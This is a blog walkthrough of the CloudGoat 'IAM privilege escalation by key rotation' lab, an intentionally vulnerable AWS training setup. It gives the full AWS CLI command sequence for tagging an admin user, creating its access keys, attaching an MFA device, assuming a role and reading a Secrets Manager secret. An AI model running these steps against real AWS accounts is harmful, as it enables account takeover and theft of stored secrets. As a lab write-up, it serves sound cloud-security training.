---
title:  "CloudGoat: IAM Privilege Escalation by Key Rotation"
date:   2024-03-12
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-12
---

In this scenario, you will start as a manager user and try to gain advantage from the compromised policies.

Let's explore what the manager user can do

In this blog, I created AWS CLI profile name `kerrigan_manager` as the manager user
{: .notice--info}

### Manager user policies
List user policies
```shell
aws --profile kerrigan_manager iam list-user-policies --user-name <manager-username>
```
Result:
```json
{
    "PolicyNames": [
        "SelfManageAccess",
        "TagResources"
    ]
}
```

See `SelfManageAccess` policy permission
```shell
aws --profile kerrigan_manager iam get-user-policy --user-name <manager-username> --policy-name SelfManageAccess
```

Result:
```json
{
    "UserName": "manager_iam_privesc_by_key_rotation_###",
    "PolicyName": "SelfManageAccess",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:DeactivateMFADevice",
                    "iam:GetMFADevice",
                    "iam:EnableMFADevice",
                    "iam:ResyncMFADevice",
                    "iam:DeleteAccessKey",
                    "iam:UpdateAccessKey",
                    "iam:CreateAccessKey"
                ],
                "Condition": {
                    "StringEquals": {
                        "aws:ResourceTag/developer": "true"
                    }
                },
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:iam::###:user/*",
                    "arn:aws:iam::###:mfa/*"
                ],
                "Sid": "SelfManageAccess"
            },
            {
                "Action": [
                    "iam:DeleteVirtualMFADevice",
                    "iam:CreateVirtualMFADevice"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:iam::###:mfa/*",
                "Sid": "CreateMFA"
            }
        ]
    }
}
```

From the result, the manager user can 
- deactivate, get, enable, and resync MFA device
- delete, update, and create access key if that user has resource tag `developer=true`
- delete and create virtual MFA Device

### Manager user managed policies
List managed policies of the manager user
```shell
aws --profile kerrigan_manager iam list-attached-user-policies --user-name <manager-username>
```

Result:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}
```

To get `IAMReadOnlyAccess` policy permission, we need to know the policy version first.
```shell
aws --profile kerrigan_manager iam get-policy --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess
```

Result:
```json
{
    "Policy": {
        "PolicyName": "IAMReadOnlyAccess",
        "Arn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess",
        "DefaultVersionId": "v4"
    }
}
```

The above result provided us a `IAMReadOnlyAccess` policy version, which is `v4`

Get `IAMReadOnlyAccess` policy permission
```shell
aws --profile kerrigan_manager iam get-policy-version --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess --version-id v4
```

Result:
```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GenerateCredentialReport",
                        "iam:GenerateServiceLastAccessedDetails",
                        "iam:Get*",
                        "iam:List*",
                        "iam:SimulateCustomPolicy",
                        "iam:SimulatePrincipalPolicy"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
    }
}
```

This policy allowed the manager user
- get and list iam components such as users, roles, and policies.

From the information that we got so far, we cannot do anything much with the manager user, so let's explore more about other users.

### Get all users in this AWS account
```shell
aws --profile kerrigan_manager iam list-users
```

Result:
```json
{
    "Users": [
        {
            "Path": "/",
            "UserName": "admin_iam_privesc_by_key_rotation_###",
            "Arn": "arn:aws:iam::###:user/admin_iam_privesc_by_key_rotation_###"
        },
        {
            "Path": "/",
            "UserName": "cloudgoat",
            "Arn": "arn:aws:iam::###:user/cloudgoat"
        },
        {
            "Path": "/",
            "UserName": "developer_iam_privesc_by_key_rotation_###",
            "Arn": "arn:aws:iam::###:user/developer_iam_privesc_by_key_rotation_###"
        },
        {
            "Path": "/",
            "UserName": "manager_iam_privesc_by_key_rotation_###",
            "Arn": "arn:aws:iam::###:user/manager_iam_privesc_by_key_rotation_###"
        }
    ]
}
```

Now, we know that we also have admin and developer users. Let's see what the admin user can do.

### Get admin policies
```shell
aws --profile kerrigan_manager iam list-user-policies --user-name <admin-username>
```

Result:
```json
{
    "PolicyNames": [
        "AssumeRoles"
    ]
}
```

See what `AssumeRoles` policy can do
```shell
aws --profile kerrigan_manager iam get-user-policy --user-name <admin-username> --policy-name AssumeRoles
```

Result:
```json
{
    "UserName": "admin_iam_privesc_by_key_rotation_###",
    "PolicyName": "AssumeRoles",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "sts:AssumeRole",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::###:role/cg_secretsmanager_iam_privesc_by_key_rotation_###",
                "Sid": "AssumeRole"
            }
        ]
    }
}
```

From the result, the admin user can assumed the `cg_secretsmanager_iam_privesc_by_key_rotation_###` role

### Get assumed role policies
List all managed role policies
```shell
aws --profile kerrigan_manager iam list-attached-role-policies --role-name cg_secretsmanager_iam_privesc_by_key_rotation_###
```

Result:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg_view_secrets_iam_privesc_by_key_rotation_###",
            "PolicyArn": "arn:aws:iam::###:policy/cg_view_secrets_iam_privesc_by_key_rotation_###"
        }
    ]
}
```

Get `cg_view_secrets_iam_privesc_by_key_rotation_###` policy version
```shell
aws --profile kerrigan_manager iam get-policy --policy-arn arn:aws:iam::###:policy/cg_view_secrets_iam_privesc_by_key_rotation_###
```

Result:
```json
{
    "Policy": {
        "PolicyName": "cg_view_secrets_iam_privesc_by_key_rotation_###",
        "Arn": "arn:aws:iam::###:policy/cg_view_secrets_iam_privesc_by_key_rotation_###",
        "DefaultVersionId": "v1"
    }
}
```

The cg_view_secrets_iam_privesc_by_key_rotation_### policy version is `v1`

Get `cg_view_secrets_iam_privesc_by_key_rotation_###` policy permission
```shell
aws --profile kerrigan_manager iam get-policy-version --policy-arn arn:aws:iam::###:policy/cg_view_secrets_iam_privesc_by_key_rotation_### --version-id v1
```

Result:
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "secretsmanager:ListSecrets",
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": "secretsmanager:GetSecretValue",
                    "Effect": "Allow",
                    "Resource": "arn:aws:secretsmanager:us-east-1:###:secret:cg_secret_iam_privesc_by_key_rotation_###-37ZBQ3"
                }
            ]
        }
    }
}
```

From all the information that we got, the admin user is able to assume the `cg_secretsmanager_iam_privesc_by_key_rotation_###` role which has a permission to get the secret!

We do not have an access key id and secret access key for the admin user. What should we do?

We knew that the manager has a permission to create an access key, so we will use this permission to create the access key for the admin user.

### Create an access key
When you try to create an access key with
```shell
aws --profile kerrigan_manager iam create-access-key --user-name <admin-username>
```

You will get an error like this
>An error occurred (AccessDenied) when calling the CreateAccessKey operation: User: arn:aws:iam::###:user/manager_iam_privesc_by_key_rotation_### is not authorized to perform: iam:CreateAccessKey on resource: user admin_iam_privesc_by_key_rotation_### because no identity-based policy allows the iam:CreateAccessKey action

This is because the admin user does not have resource tag `developer=true` (refer back to the `SelfManageAccess` policy)

So we will add the resource tag for the admin user first
```shell
aws --profile kerrigan_manager iam tag-user --user-name <admin-username> --tags Key=developer,Value=true
```

And then
```shell
aws --profile kerrigan_manager iam create-access-key --user-name <admin-username>
```

You will get `AccessKeyId` and `ScretAccessKey`. Now, you can create the admin profile from this access key.

If you don't know how <a href="{% post_url 2024-03-05-cloudgoat-vulnerable-lambda %}">see here</a>

If you have an error
>An error occurred (LimitExceeded) when calling the CreateAccessKey operation: Cannot exceed quota for AccessKeysPerUser: 2

This means the admin user already has 2 access keys, so you cannot create more access key for it.

Here is the solution

First, list all the access keys that the admin user has
```shell
aws --profile kerrigan_manager iam list-access-keys --user-name <admin-user>
```

Result:
```json
{
    "AccessKeyMetadata": [
        {
            "UserName": "admin_iam_privesc_by_key_rotation_###",
            "AccessKeyId": "<AccessKeyId>",
            "Status": "Inactive",
            "CreateDate": "2024-03-12T05:27:04+00:00"
        },
        {
            "UserName": "admin_iam_privesc_by_key_rotation_###",
            "AccessKeyId": "<AccessKeyId>",
            "Status": "Inactive",
            "CreateDate": "2024-03-12T05:27:05+00:00"
        }
    ]
}
```

Choose one access key id from the result and delete it
```shell
aws --profile kerrigan_manager iam delete-access-key --user-name <admin-username> --access-key-id <access-key-id>
```

Now you can create a new access key for the admin user.

### Assume target role
I use the cli profile name `kerrigan-admin` as the admin profile in this blog.
{: .notice--info}

Assume `cg_secretsmanager_iam_privesc_by_key_rotation_###` role
```shell
aws --profile kerrigan_admin sts assume-role --role-arn arn:aws:iam::###:role/cg_secretsmanager_iam_privesc_by_key_rotation_### --role-session-name <whatever-you-want>
```

You will get an error
>An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::###:user/admin_iam_privesc_by_key_rotation_### is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::###:role/cg_secretsmanager_iam_privesc_by_key_rotation_###


There are some reasons that we cannot assume role.
1. The user does not the permission to assume the role
2. The user did not meet the condition.

We knew that the admin user have permission to assume role, so only one reason left is the admin user did not meet some conditions.

Let's explore more about this role.
```shell
aws --profile kerrigan_admin iam get-role --role-name cg_secretsmanager_iam_privesc_by_key_rotation_###
```

We can read any IAM components  with the admin user because the admin user has managed policy `IAMReadOnlyAccess`. You can check the permission like we do with the manager user.
{: .notice--info}

Result:
```json
{
    "Role": {
        "RoleName": "cg_secretsmanager_iam_privesc_by_key_rotation_###",
        "Arn": "arn:aws:iam::###:role/cg_secretsmanager_iam_privesc_by_key_rotation_###",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::###:root"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "Bool": {
                            "aws:MultiFactorAuthPresent": "true"
                        }
                    }
                }
            ]
        }
    }
}
```

From the result, it tells us that the user who wants to assume this role should turn on Multi Factor Authentication (MFA).

### Turn on MFA
To turn on MFA, we need to use the manager user since the manager user has a permission to create MFA.

To enable MFA device, we need to create virtual MFA device first.
```shell
aws --profile kerrigan_manager iam create-virtual-mfa-device --virtual-mfa-device-name <whatever-name> --outfile <whatever-file-name>.png --bootstrap-method QRCodePNG
```

Result:
```json
{
    "VirtualMFADevice": {
        "SerialNumber": "arn:aws:iam::###:mfa/<device-name>"
    }
}
```


Open the png file, and scan the qrcode with your virtual authencicator apps. If you do not have one, you can should from the virtual authenticator apps [here](https://aws.amazon.com/iam/features/mfa/?audit=2019q1).

Now, we will enable MFA device.
```shell
aws --profile kerrigan_manager iam enable-mfa-device --user-name <admin-username> --serial-number arn:aws:iam::###:mfa/<device-name> --authentication-code1 <code1> --authentication-code2 <code2>
```

To check that our MFA device is enabled with the admin user
```shell
aws --profile kerrigan_manager iam list-virtual-mfa-devices
```

Result:
```json
{
    "VirtualMFADevices": [
        {
            "SerialNumber": "arn:aws:iam::###:mfa/<device-name>",
            "User": {
                "UserName": "admin_iam_privesc_by_key_rotation_###",
                "Arn": "arn:aws:iam::###:user/admin_iam_privesc_by_key_rotation_###",
                "CreateDate": "2024-03-12T05:27:03+00:00"
            },
            "EnableDate": "2024-03-13T11:05:40+00:00"
        }
    ]
}
```

### Assume target role, second try
Because the admin user turns on MFA, we need to add serial number and token code from authentication app for assuming the role
```shell
aws --profile kerrigan_admin sts assume-role --role-arn arn:aws:iam::###:role/cg_secretsmanager_iam_privesc_by_key_rotation_### --role-session-name <whatever-you-want> --serial-number arn:aws:iam::###:mfa/<device-name> --token-code <otp>
```

Result:
```json
{
    "Credentials": {
        "AccessKeyId": "<access-key-id>",
        "SecretAccessKey": "<secret-access-key>",
        "SessionToken": "<session-token>",
    },
    "AssumedRoleUser": {
        "Arn": "arn:aws:sts::###:assumed-role/cg_secretsmanager_iam_privesc_by_key_rotation_###/<session-name>"
    }
}
```

Create the profile from the credentials. I use profile name `kerrigan-get-secret` in this blog.

### Get secret!
You can list all the secrets
```shell
aws --profile kerrigan-get-secret secretsmanager list-secrets
```

Result:
```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:###:secret:cg_secret_iam_privesc_by_key_rotation_###-37ZBQ3",
            "Name": "cg_secret_iam_privesc_by_key_rotation_###",
        }
    ]
}
```

Get the secret!

```shell
aws --profile kerrigan-get-secret secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:###:secret:cg_secret_iam_privesc_by_key_rotation_###-37ZBQ3
```

Result:
```json
{
    "ARN": "arn:aws:secretsmanager:us-east-1:###:secret:cg_secret_iam_privesc_by_key_rotation_###-37ZBQ3",
    "Name": "cg_secret_iam_privesc_by_key_rotation_###",
    "SecretString": "<secret-value>",
    "CreatedDate": "2024-03-12T16:27:04.660000+11:00"
}
```

Thank you for reading, hope you enjoy your hacking!
